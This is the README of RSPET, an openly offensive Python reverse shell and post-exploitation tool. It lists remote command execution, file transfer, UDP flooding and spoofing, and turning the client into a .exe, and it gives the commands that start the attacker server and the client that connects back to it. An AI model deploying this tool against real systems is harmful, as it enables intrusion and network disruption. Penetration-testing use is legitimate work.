> RSPET (Reverse Shell and Post Exploitation Tool) is a Python based reverse shell equipped with functionalities that assist in a post exploitation scenario.

DISCLAIMER: This software is provided for educational and PenTesting purposes and as a proof of concept. The developer(s) do not endorse, incite or in any other way support unauthorised computer access and networks disruption.

NOTE: `min` folder has been removed. The added overhead of maintaining two versions lead to `min` not receiving bug-fixes and important updates. If there is interest, both in using and maintaining, a more bare-bone and simplistic version, a new branch will be created to host it.

Current Version: `v0.3.1`

Follow: [@TheRSPET](https://twitter.com/TheRSPET) on Twitter for updates.

## Features

* Remote Command Execution
* ~~Trafic masking (XORed instead of cleartext); for better results use port 443~~[1]
* TLS Encryption of the Server-Client communication
* Built-in File/Binary transfer (both ways) over the ~~masked~~ Encrypted traffic
* Built-in UDP Flooding tool
* Built-in UDP Spoofing tool[2]
* Multiple/All Hosts management; order File/Binary transfer and UDP Flood from Multiple/All connected Hosts
* Modular Code Design to allow easy customization
* Client script is tested and is compatible with PyInstaller (can be made into .exe)[3]
* Full server side Plug-in support[4]
* Plug-in management, including the ability to Install(Download) and Dynamically Load Plug-ins.
* RESTful API for the Server Module

*[1]The idea for XORing as well as the skeleton for the client came from [primalsecurity.net](http://www.primalsecurity.net) so if you like this pack of scripts you'll probably love what they do

*[2]UDP Spoofing uses RAW_SOCKETS so in order to utilize it, the client has to run on an OS that supports RAW_SOCKETS (most Unix-Based) and with root privileges. Finally, most of the ISPs have implementations in place that will either drop or re-structure spoofed packets

*[3]Again check [primalsecurity.net's](http://www.primalsecurity.net) perfect blogpost about producing an .exe

*[4]Detailed documentation on creating Plug-ins available in [Online Documentation](http://rspet.readthedocs.io/en/latest/dev/)!

## Deployment:

* `rspet_server.py` is situated at the attacker's machine and running to accept connections
* `rspet_client.py` is situated in the infected machine(s) and will initiate the connection and wait for input.

## Installation

Executing `./setup.py` while on the project's root folder will generate the required certificates and install all needed components through pip.    

Of course you can manually install the pip packages required by executing `pip2 install Flask flask-cors`.
Also you can generate your own key-cert set (just name them `server.key` & `server.crt` and place them inside the Server folder).

## Execution:

* Server:
```sh
python rspet_server.py [-c #clients, --ip ipToBind, -p portToBind]
```
max_connections defaults to 5 if left blank

* RESTful API:
    ```sh
    python rspet_server_api.py [-c #clients, --ip ipToBind, -p portToBind]
    ```

* Client:
```sh
python rspet_client.py <server_ip> [server_port]
```

Many changes can be made to fit individual needs.

As always if you have any suggestion, bug report or complain feel free to contact me.

## Todo

- [x] ~~Fix logic bug where if a direct command to Host OS has no output Server displays command not recognized~~
- [ ] Fix logic bug where if a direct command's to Host OS execution is perpetual the Server deadlocks
  - [ ] Investigate weather the issue resides in the Server logic or the linearity of the CLI.
- [x] ~~Add client version and type (min or full) as a property when client connects and at `List_Hosts`~~
- [x] Add TLS encryption in order to:
  - [x] Replace XORing (and subsequently obfuscation with encryption)
  - [ ] Verify the "authenticity" of clients
    - [ ] A mechanism to issue and verify client certificates
    - [ ] A mechanism to recognize compromised client certs
- [ ] Add client update mechanism (initial thought was the use of execv but it acts up)
- [x] Add a Plug-in system to client (a more compact one)
 - [ ] Add remote installation of Plug-ins to client
 - [ ] Add installed Plug-ins report from client to server
- [ ] Add UDP Reflection functionality
- [ ] Provide more settings via config file
- [ ] Re-introduce multythreading when handling multiple hosts.
- [ ] Make commands available with 'Tab' automatically generated based on loaded Plug-ins.
- [x] ~~Fix logical bug when deleting a client. (Client still shows up on List_Hosts)~~
- [x] ~~Create comprehensive Plug-in creation guide.~~
- [ ] Add support for command overridding in server plugins
- [ ] Add dependency support for server plugins

## Styleguide

This project is following [Google's Python Styleguide](https://google.github.io/styleguide/pyguide.html) with a minor variation on the use of whitespaces to align ":" tokens.

## Contribution Opportunities

This project is open for contributors. If you have implemented a new feature, or maybe an improvement to the current code feel free to open a pull request. If you want to suggest a new feature open an issue. Additionally Testers are needed to run a few standard scenarios (and a few of their own maybe) to decrease the chance a bug slips into a new version. Should there be any interest about testing a `beta` branch will be created (where code to be tested will be uploaded) along with a list of scenarios. For a full guide on contribution opportunities and guides check out [the "Contributing" chapter on RSPET's Online Documentation](http://rspet.readthedocs.io/en/latest/contribute/)
